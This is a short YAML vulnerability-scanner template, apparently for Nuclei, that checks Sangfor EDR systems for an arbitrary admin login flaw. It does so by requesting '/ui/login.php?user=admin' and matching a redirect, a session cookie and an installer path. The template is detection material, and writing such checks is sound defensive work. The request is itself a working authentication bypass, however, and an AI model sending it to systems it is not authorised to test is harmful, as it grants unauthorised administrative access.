id: sangfor-edr-arbitrary-admin-login
info:
  name: Sangfor EDR Arbitrary Admin Login
  author: ProjectDiscoveryAI
  severity: medium
  tags: access-control
  reference: []
  description: |
    This template checks for arbitrary admin login vulnerability in Sangfor EDR systems.

http:
  - method: GET
    path:
      - "/ui/login.php?user=admin"
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: body
        words:
          - "/download/edr_installer_"
      - type: word
        part: header
        words:
          - "Set-Cookie"
